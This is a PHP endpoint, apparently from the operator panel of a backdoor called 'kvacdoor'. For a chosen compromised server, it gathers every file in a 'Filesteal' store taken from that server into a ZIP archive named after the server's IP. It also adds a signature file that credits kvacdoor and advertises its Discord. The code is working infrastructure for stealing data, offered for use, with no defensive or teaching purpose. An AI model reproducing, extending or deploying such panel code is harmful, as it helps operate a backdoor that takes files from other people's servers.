<?php
session_start();
if(!isset($_SESSION['user']['id'])) {
	die();
}
ini_set('memory_limit','1024M');
require_once('../../app/Models/includes.php');
if (!User::isAuthentified() || !CSRF::isAjaxRequest() || !Server::ServerExist($_GET['id']))
{
    die("Bad request");
}

$server = Server::GetServer($_GET['id']);

$ip = $server['ip'];
$countfiles = Filesteal::CountFile($server['ip']);

$root_repertory = dirname(dirname(__DIR__)) . DIRECTORY_SEPARATOR;

if(in_array($root_repertory."data/filesteal/".$ip.".zip", glob($root_repertory."data/filesteal/*.zip"))){
	unlink($root_repertory."data/filesteal/".$ip.".zip");
}

if($countfiles != 0)
{

	if(in_array($root_repertory."data/filesteal/".$ip.".zip", glob($root_repertory."data/filesteal/*.zip"))){
		unlink($root_repertory."data/filesteal/".$ip.".zip");
	}

	$zip = new ZipArchive();

	if($zip->open($root_repertory."data/filesteal/".$server['ip'].".zip", ZipArchive::CREATE) === true)
	{

		foreach (FileSteal::SelectAllFile($server['ip']) as $file)
		{
			$zip->addFromString($file["filename"], $file["content"]);
		}

		$zip->addFromString("filestealed with kvacdoor.txt", "numbers of files : $countfiles,\nby kvacdoor.cz https://kvac.cz/join/discord");
		$zip->close();

	}

}

?>